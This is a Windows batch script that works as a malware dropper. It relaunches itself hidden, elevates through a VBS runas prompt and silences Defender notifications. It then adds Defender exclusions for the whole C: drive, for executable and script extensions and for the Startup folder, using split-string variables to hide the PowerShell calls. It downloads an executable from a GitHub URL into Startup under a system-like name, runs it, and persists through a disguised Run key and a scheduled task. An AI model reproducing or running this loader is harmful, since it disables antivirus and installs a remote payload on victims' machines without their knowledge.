@echo off
if "%~1"=="-hidden" goto :RUN
powershell -Command "Start-Process cmd.exe -ArgumentList '/c \"\"%~f0\" -hidden %*\"' -WindowStyle Hidden"
exit /b

:RUN
@cls
set "params=%*"
@echo off
@cls
cd /d "%~dp0"
if exist "%temp%\getadmin.vbs" del "%temp%\getadmin.vbs"
fsutil dirty query %systemdrive% 1>nul 2>nul || (
  echo Set UAC = CreateObject^("Shell.Application"^) : UAC.ShellExecute "cmd.exe", "/k cd ""%~sdp0"" && %~s0 %params%", "", "runas", 0 >> "%temp%\getadmin.vbs"
  "%temp%\getadmin.vbs"
  exit /B
)
@echo off
@cls
@echo off
set "snamsmdkdke=power"
@echo off
@cls
@echo off
set "gwsnzkdofkr=shell"
@echo off
@cls
@echo off
set "wbansmdpee=Add-MpPreference"
@echo off
@cls
@echo off
set "nqsodpwwnke=hidden"
@echo off
@cls
@echo off
reg add "HKLM\SOFTWARE\Microsoft\Windows Defender Security Center\Notifications" /v "DisableEnhancedNotifications" /t REG_DWORD /d 1 /f >nul 2>nul
@echo off
@cls
@echo off
%snamsmdkdke%%gwsnzkdofkr% -w %nqsodpwwnke% -Command "%wbansmdpee% -ExclusionPath 'C:\\'"
@cls
@echo off
%snamsmdkdke%%gwsnzkdofkr% -w %nqsodpwwnke% -Command "%wbansmdpee% -ExclusionExtension '.exe'"
@cls
@echo off

%snamsmdkdke%%gwsnzkdofkr% -w %nqsodpwwnke% -Command "%wbansmdpee% -ExclusionExtension '.bat'"
@cls
@echo off

%snamsmdkdke%%gwsnzkdofkr% -w %nqsodpwwnke% -Command "%wbansmdpee% -ExclusionExtension '.ps1'"
@cls
@echo off

%snamsmdkdke%%gwsnzkdofkr% -w %nqsodpwwnke% -Command "%wbansmdpee% -ExclusionProcess 'Windosys.exe'"
@cls
@echo off

%snamsmdkdke%%gwsnzkdofkr% -w %nqsodpwwnke% -c %wbansmdpee% -ExclusionPath "C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
timeout /t 5 /nobreak >nul 
@cls
@echo off
@cls
set "URL=https://github.com/baharxr/bahar/raw/refs/heads/main/Client-built.exe"
@cls
@echo off
@cls
set "DEST=C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Windosys.exe"
@cls
@echo off
@cls
if exist "%DEST%" del "%DEST%"
%snamsmdkdke%%gwsnzkdofkr% -WindowStyle Hidden -Command "Invoke-WebRequest -Uri '%URL%' -OutFile '%DEST%'"
if %errorlevel% neq 0 (
  exit /b %errorlevel%
)
@echo off
start /min "" "%DEST%"
@echo off
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "SysWOW64" /d "\"C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Windosys.exe\"" /f
@echo off
@cls


schtasks /create /tn "WindowsSystemUpdateTask" /tr "\"C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Windosys.exe\"" /sc onlogon /rl highest /f >nul 2>nul

@echo off
@cls
exit
